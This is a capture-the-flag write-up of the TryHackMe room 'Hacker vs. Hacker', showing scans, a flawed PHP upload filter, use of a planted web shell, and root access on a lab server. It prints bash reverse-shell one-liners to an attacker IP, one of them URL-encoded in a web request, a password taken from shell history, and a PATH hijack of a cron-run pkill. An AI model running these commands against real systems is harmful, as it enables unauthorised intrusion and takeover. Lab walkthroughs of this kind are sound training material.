---
title: "TryHackMe - Hacker vs. Hacker"
tags: ["file-upload", "php", "bash-history", "web", "linux"]
---

## Introduction

This is a **TryHackMe** room which can be found at: <a href="https://tryhackme.com/room/hackervshacker" target="_blank">Hacker vs. Hacker</a>

Someone has compromised this server already! Can you get in and evade their countermeasures?

## Reconnaissance & Scanning

Perform `nmap` scan to identify open ports and services.
- Command: `nmap -p- -T4 -v 10.10.156.143`

```shell
geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST
Initiating Ping Scan at 21:48
Scanning 10.10.156.143 [2 ports]
Completed Ping Scan at 21:48, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:48
Completed Parallel DNS resolution of 1 host. at 21:48, 0.00s elapsed
Initiating Connect Scan at 21:48
Scanning 10.10.156.143 (10.10.156.143) [65535 ports]
Discovered open port 22/tcp on 10.10.156.143
Discovered open port 80/tcp on 10.10.156.143
Connect Scan Timing: About 39.43% done; ETC: 21:49 (0:00:48 remaining)
Completed Connect Scan at 21:49, 75.01s elapsed (65535 total ports)
Nmap scan report for 10.10.156.143 (10.10.156.143)
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 75.16 seconds
```

- Command: `sudo nmap -A -p 22,80 -v 10.10.156.143`

```shell
geobour98@kali:~$ sudo nmap -A -p 22,80 -v 10.10.156.143
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:50 EEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:50
Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed
Initiating SYN Stealth Scan at 21:50
Scanning 10.10.156.143 (10.10.156.143) [2 ports]
Discovered open port 22/tcp on 10.10.156.143
Discovered open port 80/tcp on 10.10.156.143
Completed SYN Stealth Scan at 21:50, 0.10s elapsed (2 total ports)
Initiating Service scan at 21:50
Scanning 2 services on 10.10.156.143 (10.10.156.143)
Completed Service scan at 21:50, 6.21s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.156.143 (10.10.156.143)
Retrying OS detection (try #2) against 10.10.156.143 (10.10.156.143)
Initiating Traceroute at 21:50
Completed Traceroute at 21:50, 0.08s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:50
Completed Parallel DNS resolution of 1 host. at 21:50, 0.00s elapsed
NSE: Script scanning 10.10.156.143.
Initiating NSE at 21:50
Completed NSE at 21:50, 2.99s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.27s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Nmap scan report for 10.10.156.143 (10.10.156.143)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 33.377 days (since Wed Jul 20 12:48:00 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   67.28 ms 10.8.0.1 (10.8.0.1)
2   66.56 ms 10.10.156.143 (10.10.156.143)

NSE: Script Post-scanning.
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Initiating NSE at 21:50
Completed NSE at 21:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
           Raw packets sent: 56 (4.084KB) | Rcvd: 40 (3.056KB)
```

- Command: `gobuster dir -u http://10.10.156.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40`


```shell
geobour98@kali:~$ gobuster dir -u http://10.10.151.143/ -x txt,html,php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.156.143/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/08/22 21:53:10 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.156.143/css/]
/cvs                  (Status: 301) [Size: 312] [--> http://10.10.156.143/cvs/]
/dist                 (Status: 301) [Size: 313] [--> http://10.10.156.143/dist/]
/images               (Status: 301) [Size: 315] [--> http://10.10.156.143/images/]
/index.html           (Status: 200) [Size: 3413]                                  
/index.html           (Status: 200) [Size: 3413]                                  
/server-status        (Status: 403) [Size: 278]                                   
/upload.php           (Status: 200) [Size: 552]                                   
===============================================================
2022/08/22 21:54:06 Finished
===============================================================
```

After navigating to port 80 in a web browser, we see an interesting file upload functionality, but nothing happens when we try to upload a file. Then, we navigate to /upload.php and view it's source code:


```php
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

## Exploitation

A possible vulnerability on `strpos()` would be to upload a file with `.pdf.php` extension. But this doesn't work too. Then we search for already uploaded files with this extension in `cvs/` directory.

- Command: `gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40`


```shell
geobour98@kali:~$ gobuster dir -u http://10.10.156.143/cvs/ -x pdf.php -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.156.143/cvs/
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
2022/08/22 21:59:29 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.pdf.php    (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.pdf.php    (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.pdf.php         (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 26] 
/shell.pdf.php        (Status: 200) [Size: 18] 
===============================================================
2022/08/22 21:59:57 Finished
===============================================================
```

Just try the basic parameter `cmd` to check for code execution. The URL is: `http://10.10.156.143/cvs/shell.pdf.php?cmd=id` and we do have code execution because the output is: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. In order to get a reverse shell, we intercept that request with Burp proxy, send it to Repeater, and execute a bash reverse shell like the following: `bash -c 'exec bash -i &>/dev/tcp/10.8.200.50/443 <&1'`, but it has to be URL-encoded.

The request in Burp should look like this:


```console
GET /cvs/shell.pdf.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.8.200.50/443+<%261' HTTP/1.1
Host: 10.10.186.151
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0


```

Open a netcat listener and we have reverse shell as `www-data`:


```shell
www-data@b2r:/var/www/html/cvs$ whoami
www-data
```

There is an interesting file `.bash_history` in user's lachlan home directory (/home/lachlan), which contains the password of that user:


```shell
www-data@b2r:/home/lachlan$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\n[REDACTED]\n[REDACTED]" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

Next, we become user lachlan with the found password.
- Command: `su lachlan`

We can also read the first flag, user.txt:


```shell
lachlan@b2r:/home/lachlan$ cat user.txt
thm{[REDACTED]}
```

## Privilege Escalation

After using the <a href="https://github.com/DominicBreuker/pspy" target="_blank">pspy</a> tool in order to monitor processes without root permissions, we identified a process `pkill` running without absolute path.


```shell
lachlan@b2r:/home/lachlan$ ./pspy64                                                                                                                      
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855                                                 
                                                                                                                              
                                                                                                                              
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                       
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                       
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                       
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                       
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                       
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                        
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                        
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                         
                   ░           ░ ░                                                                                            
                               ░ ░                                                                                            
                                                                                                                              
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and 
on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/08/22 19:22:17 CMD: UID=0    PID=95     | 
2022/08/22 19:22:17 CMD: UID=0    PID=94     | 
2022/08/22 19:22:17 CMD: UID=0    PID=93     | 
2022/08/22 19:22:17 CMD: UID=0    PID=911    |
2022/08/22 19:22:17 CMD: UID=0    PID=91     | 
2022/08/22 19:22:17 CMD: UID=0    PID=90     | 
2022/08/22 19:22:17 CMD: UID=0    PID=9      | 
2022/08/22 19:22:17 CMD: UID=0    PID=89     | 
2022/08/22 19:22:17 CMD: UID=0    PID=88     | 
2022/08/22 19:22:17 CMD: UID=0    PID=87     | 
2022/08/22 19:22:17 CMD: UID=0    PID=86     | 
2022/08/22 19:22:17 CMD: UID=0    PID=85     | 
2022/08/22 19:22:17 CMD: UID=0    PID=84     | 
2022/08/22 19:22:17 CMD: UID=0    PID=82     | 
2022/08/22 19:22:17 CMD: UID=0    PID=81     | 
2022/08/22 19:22:17 CMD: UID=0    PID=806    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --w
ait-for-signal 
2022/08/22 19:22:17 CMD: UID=0    PID=78     | 
2022/08/22 19:22:17 CMD: UID=0    PID=779    | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=0    PID=77     | 
2022/08/22 19:22:17 CMD: UID=0    PID=76     | 
2022/08/22 19:22:17 CMD: UID=0    PID=75     | 
2022/08/22 19:22:17 CMD: UID=0    PID=74     | 
2022/08/22 19:22:17 CMD: UID=0    PID=73     | 
2022/08/22 19:22:17 CMD: UID=0    PID=726    | /usr/bin/ssm-agent-worker 
2022/08/22 19:22:17 CMD: UID=0    PID=72     | 
2022/08/22 19:22:17 CMD: UID=0    PID=71     | 
2022/08/22 19:22:17 CMD: UID=0    PID=709    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2022/08/22 19:22:17 CMD: UID=0    PID=70     |
2022/08/22 19:22:17 CMD: UID=0    PID=69     | 
2022/08/22 19:22:17 CMD: UID=0    PID=683    | /usr/sbin/ModemManager 
2022/08/22 19:22:17 CMD: UID=0    PID=649    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2022/08/22 19:22:17 CMD: UID=0    PID=644    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2022/08/22 19:22:17 CMD: UID=0    PID=633    | /usr/sbin/atd -f 
2022/08/22 19:22:17 CMD: UID=0    PID=630    | /usr/lib/udisks2/udisksd 
2022/08/22 19:22:17 CMD: UID=0    PID=628    | /lib/systemd/systemd-logind 
2022/08/22 19:22:17 CMD: UID=0    PID=623    | /usr/lib/snapd/snapd 
2022/08/22 19:22:17 CMD: UID=104  PID=619    | /usr/sbin/rsyslogd -n -iNONE 
2022/08/22 19:22:17 CMD: UID=0    PID=615    | /usr/lib/policykit-1/polkitd --no-debug 
2022/08/22 19:22:17 CMD: UID=0    PID=611    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2022/08/22 19:22:17 CMD: UID=103  PID=602    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd
-activation --syslog-only 
2022/08/22 19:22:17 CMD: UID=0    PID=6      | 
2022/08/22 19:22:17 CMD: UID=0    PID=599    | /usr/sbin/cron -f 
2022/08/22 19:22:17 CMD: UID=0    PID=593    | /usr/bin/amazon-ssm-agent 
2022/08/22 19:22:17 CMD: UID=0    PID=592    | /usr/lib/accountsservice/accounts-daemon 
2022/08/22 19:22:17 CMD: UID=101  PID=570    | /lib/systemd/systemd-resolved 
2022/08/22 19:22:17 CMD: UID=100  PID=560    | /lib/systemd/systemd-networkd 
2022/08/22 19:22:17 CMD: UID=102  PID=521    | /lib/systemd/systemd-timesyncd 
2022/08/22 19:22:17 CMD: UID=0    PID=504    | 
2022/08/22 19:22:17 CMD: UID=0    PID=503    | 
2022/08/22 19:22:17 CMD: UID=0    PID=496    | 
2022/08/22 19:22:17 CMD: UID=0    PID=494    | 
2022/08/22 19:22:17 CMD: UID=0    PID=491    |
2022/08/22 19:22:17 CMD: UID=0    PID=483    | /sbin/multipathd -d -s 
2022/08/22 19:22:17 CMD: UID=0    PID=482    | 
2022/08/22 19:22:17 CMD: UID=0    PID=481    | 
2022/08/22 19:22:17 CMD: UID=0    PID=480    | 
2022/08/22 19:22:17 CMD: UID=0    PID=479    | 
2022/08/22 19:22:17 CMD: UID=0    PID=4      | 
2022/08/22 19:22:17 CMD: UID=0    PID=372    | /lib/systemd/systemd-udevd 
2022/08/22 19:22:17 CMD: UID=0    PID=364    | 
2022/08/22 19:22:17 CMD: UID=0    PID=343    | /lib/systemd/systemd-journald 
2022/08/22 19:22:17 CMD: UID=0    PID=3      | 
2022/08/22 19:22:17 CMD: UID=0    PID=269    | 
2022/08/22 19:22:17 CMD: UID=0    PID=268    | 
2022/08/22 19:22:17 CMD: UID=0    PID=2628   | /lib/systemd/systemd-udevd 
2022/08/22 19:22:17 CMD: UID=0    PID=2624   | 
2022/08/22 19:22:17 CMD: UID=1001 PID=2614   | ./pspy64 
2022/08/22 19:22:17 CMD: UID=0    PID=2609   | /bin/sleep 51 
2022/08/22 19:22:17 CMD: UID=0    PID=2608   | /bin/sleep 41 
2022/08/22 19:22:17 CMD: UID=0    PID=2607   | /bin/sh -c /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:22:17 CMD: UID=0    PID=2606   | /bin/sleep 31 
2022/08/22 19:22:17 CMD: UID=0    PID=2605   | /bin/sleep 21 
2022/08/22 19:22:17 CMD: UID=0    PID=2602   | /bin/sh -c /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done
2022/08/22 19:22:17 CMD: UID=0    PID=2601   | /bin/sh -c /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:22:17 CMD: UID=0    PID=2600   | /bin/sh -c /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:22:17 CMD: UID=0    PID=2595   | /usr/sbin/CRON -f 
2022/08/22 19:22:17 CMD: UID=0    PID=2594   | /usr/sbin/CRON -f 
2022/08/22 19:22:17 CMD: UID=0    PID=2593   | /usr/sbin/CRON -f 
2022/08/22 19:22:17 CMD: UID=0    PID=2592   | /usr/sbin/CRON -f 
2022/08/22 19:22:17 CMD: UID=1001 PID=2455   | sh 
2022/08/22 19:22:17 CMD: UID=0    PID=2452   | 
2022/08/22 19:22:17 CMD: UID=1001 PID=2449   | (sd-pam) 
2022/08/22 19:22:17 CMD: UID=1001 PID=2448   | /lib/systemd/systemd --user 
2022/08/22 19:22:17 CMD: UID=33   PID=2436   | su lachlan 
2022/08/22 19:22:17 CMD: UID=0    PID=23     | 
2022/08/22 19:22:17 CMD: UID=0    PID=224    | 
2022/08/22 19:22:17 CMD: UID=0    PID=22     | 
2022/08/22 19:22:17 CMD: UID=0    PID=21     | 
2022/08/22 19:22:17 CMD: UID=33   PID=2021   | bash -i 
2022/08/22 19:22:17 CMD: UID=33   PID=2020   | sh -c bash -c 'exec bash -i &>/dev/tcp/10.8.200.50/443 <&1' 
2022/08/22 19:22:17 CMD: UID=0    PID=20     | 
2022/08/22 19:22:17 CMD: UID=0    PID=2      | 
2022/08/22 19:22:17 CMD: UID=0    PID=1993   |
2022/08/22 19:22:17 CMD: UID=0    PID=198    | 
2022/08/22 19:22:17 CMD: UID=0    PID=1976   | 
2022/08/22 19:22:17 CMD: UID=0    PID=19     | 
2022/08/22 19:22:17 CMD: UID=0    PID=18     | 
2022/08/22 19:22:17 CMD: UID=0    PID=170    | 
2022/08/22 19:22:17 CMD: UID=0    PID=17     | 
2022/08/22 19:22:17 CMD: UID=0    PID=16     | 
2022/08/22 19:22:17 CMD: UID=0    PID=1585   | 
2022/08/22 19:22:17 CMD: UID=33   PID=1536   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1534   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1533   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1515   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1514   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1500   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=0    PID=15     | 
2022/08/22 19:22:17 CMD: UID=33   PID=1490   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1478   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=33   PID=1468   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=0    PID=14     | 
2022/08/22 19:22:17 CMD: UID=0    PID=13     | 
2022/08/22 19:22:17 CMD: UID=0    PID=120    | 
2022/08/22 19:22:17 CMD: UID=0    PID=12     | 
2022/08/22 19:22:17 CMD: UID=33   PID=1171   | /usr/sbin/apache2 -k start 
2022/08/22 19:22:17 CMD: UID=0    PID=11     | 
2022/08/22 19:22:17 CMD: UID=0    PID=107    |
2022/08/22 19:22:17 CMD: UID=0    PID=104    | 
2022/08/22 19:22:17 CMD: UID=0    PID=10     | 
2022/08/22 19:22:17 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/08/22 19:22:22 CMD: UID=0    PID=2632   | 
2022/08/22 19:22:32 CMD: UID=0    PID=2635   | 
2022/08/22 19:22:37 CMD: UID=0    PID=2636   | 
2022/08/22 19:22:42 CMD: UID=0    PID=2639   | pkill -9 -t pts/ptmx 
2022/08/22 19:22:52 CMD: UID=0    PID=2642   | 
2022/08/22 19:23:01 CMD: UID=0    PID=2648   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2647   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2646   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2645   | /usr/sbin/cron -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2644   | /usr/sbin/cron -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2643   | /usr/sbin/cron -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2650   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2649   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2651   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2652   | /bin/sh -c /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:23:01 CMD: UID=0    PID=2654   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2653   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2655   | /bin/sh -c /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:23:01 CMD: UID=0    PID=2656   | /bin/sh -c /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done
2022/08/22 19:23:01 CMD: UID=0    PID=2657   | /bin/sh -c /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:23:01 CMD: UID=0    PID=2659   | /usr/sbin/CRON -f 
2022/08/22 19:23:01 CMD: UID=0    PID=2658   | /bin/sh -c /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope 
> /dev/pts/$f && pkill -9 -t pts/$f; done 
2022/08/22 19:23:01 CMD: UID=0    PID=2660   | /bin/sleep 51 
2022/08/22 19:23:02 CMD: UID=0    PID=2663   | pkill -9 -t pts/ptmx
```

Then we can modify `PATH` variable, in order to prepend /home/lachlan/bin, so we can create a malicious file named `pkill`, which will be executed from our location first.


```shell
lachlan@b2r:/home/lachlan/bin$ export PATH=/home/lachlan/bin:$PATH
lachlan@b2r:/home/lachlan/bin$ echo $PATH
/home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
lachlan@b2r:/home/lachlan/bin$ echo "bash -c 'exec bash -i &>/dev/tcp/10.8.200.50/444 <&1'" > pkill
```

Then open another netcat listener and after a while the process `pkill` is executed with our file we get a root reverse shell.


```shell
root@b2r:~# cat root.txt
thm{[REDACTED]}
```

Proof of Concept (PoC image):

![Desktop View](/assets/img/hackervshacker/poc.png){: width="972" height="589" }
